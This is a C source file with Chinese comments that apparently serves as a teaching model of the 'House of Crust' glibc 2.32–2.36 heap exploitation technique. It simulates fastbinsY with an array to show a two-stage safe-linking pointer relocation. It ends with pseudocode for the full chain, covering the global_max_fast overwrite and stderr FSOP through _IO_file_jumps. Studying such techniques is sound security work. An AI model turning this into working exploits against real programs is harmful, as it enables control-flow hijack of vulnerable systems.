/*
 * House of Crust 的两段 fastbin 指针搬运源码模型，适用于 glibc 2.32～2.36。
 *
 * 真实利用需要先覆盖 global_max_fast，并让 fastbinsY 的远端索引落到 libc
 * 目标字段。这里用一个数组代表 fastbinsY，只展开指针搬运本身：
 *
 *     源槽 -> 可编辑中转区 -> 修改指针值 -> 目标槽
 *
 * 代码中的每次赋值都对应 `_int_free` 或 `_int_malloc` 的一条关键语句。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

/* x86-64 的 fastbin 索引公式。 */
#define FASTBIN_INDEX(size) (((size) >> 4) - 2)

/* glibc 2.32 起 fastbin fd 的 safe-linking 公式。 */
#define PROTECT_PTR(position, pointer) \
    ((((size_t)(position)) >> 12) ^ ((size_t)(pointer)))

int main(void)
{
    /* 用这个数组直接表示 main_arena.fastbinsY 后面的连续 qword。 */
    size_t fastbins_y[64] = {0};

    /* victim 使用真实 malloc 地址，因此 fd 的 safe-linking key 来自真实堆地址。 */
    size_t *victim = malloc(0x30);

    /* victim[0] 就是 free 后的 fd 字段。 */
    size_t *fd = &victim[0];

    /* 三个索引分别代表源、可编辑的 libc 零区和最终目的地。 */
    size_t source_index = 8;
    size_t relay_index = 24;
    size_t destination_index = 40;

    /* 由 size = 2 * delta + 0x20 反算三个物理 chunk size。 */
    size_t source_size = source_index * 0x10 + 0x20;
    size_t relay_size = relay_index * 0x10 + 0x20;
    size_t destination_size = destination_index * 0x10 + 0x20;

    /* 确认三个 size 确实回到预期的 fastbin 索引。 */
    assert(FASTBIN_INDEX(source_size) == source_index);
    assert(FASTBIN_INDEX(relay_size) == relay_index);
    assert(FASTBIN_INDEX(destination_size) == destination_index);

    /* 源槽中原本保存着一个希望搬运的 libc 指针。 */
    size_t source_value = 0x7ffff7e12040;
    fastbins_y[source_index] = source_value;

    /*
     * House of Corrosion 前置步骤已经让 victim 同时挂在中转区对应的
     * fastbin 头槽中。这里直接写入该输入状态，不展开重叠 chunk 和自环过程。
     */
    fastbins_y[relay_index] = (size_t)(victim - 2);

    /* ---------- 第一段：源槽 -> 可编辑中转区 ---------- */

    /* 把 victim 的物理 size 改成源槽对应的 size。 */
    victim[-1] = source_size | 1;

    /* 对应释放源码：victim->fd = PROTECT_PTR(&victim->fd, *source_head)。 */
    *fd = PROTECT_PTR(fd, fastbins_y[source_index]);

    /* `_int_free`：*source_head = victim 的 chunk 头。 */
    fastbins_y[source_index] = (size_t)(victim - 2);

    /* malloc 前把 victim size 改回中转区头槽对应的 size。 */
    victim[-1] = relay_size | 1;

    /* 中转区头槽当前取出的节点必须是 victim。 */
    assert(fastbins_y[relay_index] == (size_t)(victim - 2));

    /* `_int_malloc`：解码 victim->fd，并把结果写回中转区头槽。 */
    fastbins_y[relay_index] = PROTECT_PTR(fd, *fd);

    /* 第一段结束后，可编辑中转区中出现源槽的明文指针。 */
    assert(fastbins_y[relay_index] == source_value);

    /* Rust 前半链已经取得中转区 chunk，因此这里可以直接修改明文指针。 */
    size_t modified_value = 0x7ffff7e12ab0;
    fastbins_y[relay_index] = modified_value;

    /*
     * House of Corrosion 前置步骤也让 victim 挂在目标槽对应的 fastbin 中。
     * 这正是第二段搬运开始前需要的输入状态。
     */
    fastbins_y[destination_index] = (size_t)(victim - 2);

    /* ---------- 第二段：可编辑中转区 -> 目标槽 ---------- */

    /* 把 victim 的物理 size 改成可编辑中转区对应的 size。 */
    victim[-1] = relay_size | 1;

    /* `_int_free`：把中转区中修改后的明文指针编码进 victim->fd。 */
    *fd = PROTECT_PTR(fd, fastbins_y[relay_index]);

    /* `_int_free`：中转区头槽现在指向 victim。 */
    fastbins_y[relay_index] = (size_t)(victim - 2);

    /* malloc 前把 victim size 改成目标槽对应的 size。 */
    victim[-1] = destination_size | 1;

    /* 目标槽当前取出的节点必须是 victim。 */
    assert(fastbins_y[destination_index] == (size_t)(victim - 2));

    /* `_int_malloc`：解码 victim->fd，并把修改后的值写入目标槽。 */
    fastbins_y[destination_index] = PROTECT_PTR(fd, *fd);

    /* 最终目的地必须精确得到修改后的指针。 */
    assert(fastbins_y[destination_index] == modified_value);

    printf("[+] 两段指针搬运完成\n");

    /* victim 的真实 size 已被破坏，教学 PoC 直接退出，不再 free。 */
    return 0;
}

/*
 * ======================== 地址换算与完整链伪代码 ========================
 *
 * 不再使用独立地址计算器。拿到附件地址后，直接按下列公式逐个计算：
 *
 *     delta = target - &main_arena.fastbinsY[0]；
 *     assert(delta >= 0 && delta % 8 == 0)；          // 目标必须位于可索引的槽边界
 *     chunk_size = 2 * delta + 0x20；
 *     malloc_request = (chunk_size & ~7) - 0x10；     // 换回用户请求大小
 *     safe_linking_key = &victim->fd >> 12；
 *
 * 对 source、editable_zone、destination 三个地址分别计算 size/request，
 * 搬运顺序固定为：
 *
 *     source -> editable_zone -> 修改明文指针 -> destination；
 *
 * 原版 Crust 的共享堆步骤：
 *
 *     完成 Rust 前半的两轮 TSU+/TSU 和两轮 largebin；
 *     取得 tcache_perthread_struct 内部 chunk 与邻近 libc 指针；
 *     覆盖 global_max_fast；
 *     准备可反复修改 size/fd 的 victim 和约 0x4000 安全值区域；
 *     用本文件验证的两段算法搬运并修改跳转表/辅助对象；
 *     恢复 global_max_fast，触发 stderr FSOP；
 *
 * 最终控制流必须额外确认：`_IO_file_jumps` 所在映射可写、目标 gadget 与
 * 寄存器状态匹配、libc 低四位猜测命中。2.37 起 global_max_fast 只有
 * uint8_t，最远只能访问 fastbinsY+0x68 附近，核心搬运无法继续。
 */
